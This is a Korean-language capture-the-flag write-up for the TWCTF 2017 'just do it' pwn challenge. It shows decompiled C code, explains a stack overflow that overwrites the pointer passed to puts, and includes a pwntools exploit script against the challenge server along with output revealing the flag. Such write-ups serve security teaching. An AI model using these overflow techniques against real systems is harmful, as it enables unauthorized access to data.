# [2017_TWCTF] \[PWN] just do it

### Problem

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [sp+8h] [bp-20h]@7
  FILE *stream; // [sp+18h] [bp-10h]@1
  char *v6; // [sp+1Ch] [bp-Ch]@1

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 2, 0);
  v6 = failed_message;
  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    perror("file open error.\n");
    exit(0);
  }
  if ( !fgets(flag, 48, stream) )
  {
    perror("file read error.\n");
    exit(0);
  }
  puts("Welcome my secret service. Do you know the password?");
  puts("Input the password.");
  if ( !fgets(&s, 32, stdin) )
  {
    perror("input error.\n");
    exit(0);
  }
  if ( !strcmp(&s, PASSWORD) )
    v6 = success_message;
  puts(v6);
  return 0;
}
```

flag를 읽어와서 전역 변수에 저장합니다.



### 취약점 - Stack based Overflow

`char s; // [sp+8h][bp-20h]@7`에서 s라는 변수가 ebp로부터 0x20만큼 떨어져있음을 알 수 있습니다.

` if ( !fgets(&s, 32, stdin) )`에서 32바이트를 입력받는데 이를 통해 오버플로우를 일으킬 수 있습니다.

마지막에 `  puts(v6);`가 있는데 v6의 값을 flag 전역변수의 주소값으로 변경시키면 flag가 출력됩니다.



### Exploit

```python
from pwn import *

#p = process("./just_do_it")
p = connect("pwn1.chal.ctf.westerns.tokyo",12345)
print p.recv()
payload = "a"*(0x20-0xc) + p32(0x0804A080)
p.send(payload)
p.interactive()
```



### 실행 결과

```
$ python ex.py 
[+] Opening connection to pwn1.chal.ctf.westerns.tokyo on port 12345: Done
Welcome my secret service. Do you know the password?
Input the password.

[*] Switching to interactive mode
$ 
TWCTF{pwnable_warmup_I_did_it!}
```

